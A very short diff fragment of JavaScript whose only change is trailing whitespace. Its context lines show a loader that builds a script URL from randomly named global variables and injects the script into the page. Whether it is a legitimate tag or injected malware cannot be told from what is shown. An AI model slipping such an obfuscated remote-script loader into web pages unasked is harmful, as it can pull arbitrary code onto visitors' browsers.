@@ -39,5 +39,5 @@
         a.src = window._vcccHrn1gr4QJPWc.R_PATH + _HRzZMkKZ7rGtYNRh;
     var s = document.getElementsByTagName('script')[0];
     s.parentNode.insertBefore(a, s)
-    })();
+    })(); 
   
